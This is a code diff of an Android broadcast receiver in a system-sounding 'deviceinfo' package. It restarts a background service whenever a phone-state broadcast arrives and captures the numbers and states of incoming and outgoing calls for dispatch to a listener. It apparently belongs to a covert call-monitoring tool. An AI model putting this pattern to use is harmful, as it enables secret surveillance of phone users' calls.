@@ -6,7 +6,7 @@
  * Created      : 6-mag-2011
  * Author		: zeno
  * *******************************************/
-
+//
 package com.android.deviceinfo.listener;
 
 import android.content.BroadcastReceiver;
@@ -24,6 +24,7 @@ public class BC extends BroadcastReceiver {
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$
 	private static Call call = null;
+	private Object lastKnownPhoneState;
 
 	/*
 	 * (non-Javadoc)
@@ -33,29 +34,36 @@ public class BC extends BroadcastReceiver {
 	 */
 	@Override
 	public void onReceive(Context context, Intent intent) {
+
+		if (Core.isServiceRunning() == false) {
+			Intent serviceIntent = new Intent(context, ServiceMain.class);
+
+			// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
+			context.startService(serviceIntent);
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
+			}
+
+			return;
+		}
+
+		if (intent == null) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
+			}
+
+			return;
+		}
+
+		//if (intent != null && intent.getAction().equals(TelephonyManager.ACTION_PHONE_STATE_CHANGED)) {
+			manageReceive(context, intent);
+		//}
+
+	}
+
+	public void manageReceive(Context context, Intent intent) {
 		try {
-			if (Core.isServiceRunning() == false) {
-				Intent serviceIntent = new Intent(context, ServiceMain.class);
-
-				// serviceIntent.setAction(Messages.getString("com.android.service_ServiceCore"));
-				context.startService(serviceIntent);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
-				}
-
-				return;
-			}
-
-			if (intent == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
-				}
-
-				return;
-			}
-
-
 			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
 
 			if (Cfg.DEBUG) {
@@ -70,7 +78,7 @@ public class BC extends BroadcastReceiver {
 					Check.log(TAG + " (onReceive): 1 OUTGOING, number: " + number);//$NON-NLS-1$
 				}
 
-				call = new Call(number, Call.OUTGOING, Call.START);
+				call = new Call(number, Call.OUTGOING);
 			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// il numero delle chiamate entranti lo abbiamo solo qui
 				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
@@ -80,35 +88,51 @@ public class BC extends BroadcastReceiver {
 					Check.log(TAG + " (onReceive): 2 RINGING, number: " + number);//$NON-NLS-1$
 				}
 
-				call = new Call(number, Call.INCOMING, Call.START);
+				call = new Call(number, Call.INCOMING);
 			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
 				// Call disconnected
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): 3 IDLE -> END");//$NON-NLS-1$
+					Check.log(TAG + " (onReceive): 3 IDLE -> END");
 				}
 
 				if (call != null) {
-					if (call.isIncoming())
-						call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
-					else
-						call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
+					if (call.isIncoming()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onReceive) RECEIVING CALL");
+						}
 
-					call.setComplete();
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (onReceive) ENDING OUTGOING CALL"); // don't
+																					// know
+																					// if
+																					// answered..
+						}
+
+					}
+					call.setOngoing(false);
+					call.setComplete(true);
+				} else {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (manageReceive) null call, don't propagate");
+					}
+					return;
 				}
-			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { 
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
 				// Qui la chiamata e' davvero in corso
 				// Call answered, or issuing new outgoing call
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive): 4 OFFHOOK");//$NON-NLS-1$
+					Check.asserts(call != null, " (onReceive) Assert failed: call null");
 				}
 
-				if (call == null) {
+				if (call != null) {
+					// call.setComplete(true);
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (onReceive): we didn't catch the ringing"); //$NON-NLS-1$
+						Check.log(TAG + " (onReceive): 4 OFFHOOK, call ready");//$NON-NLS-1$
 					}
-				} else {
-					call.setComplete();
-					Check.log(TAG + " (onReceive): 4 OFFHOOK, call ready");//$NON-NLS-1$
+					call.setOngoing(true);
+					call.setOffhook();
 				}
 
 				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
@@ -116,14 +140,20 @@ public class BC extends BroadcastReceiver {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (onReceive): default, assume END");//$NON-NLS-1$
 				}
+				if (Cfg.DEBUG) {
+					Check.asserts(call != null, " (onReceive) Assert failed: call null");
+				}
+				if (call != null) {
+					call.setOngoing(false);
+					call.setComplete(false);
+				}
 
-				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
-				call.setComplete();
+				return;
 			}
 
 			// Caller/Callee number, incoming?/outgoing, in
 			// progress?/disconnected
-			if (call != null && call.isComplete() == true) {
+			if (call != null && call.changedState()) {
 				ListenerCall.self().dispatch(call);
 			}
 		} catch (Exception ex) {
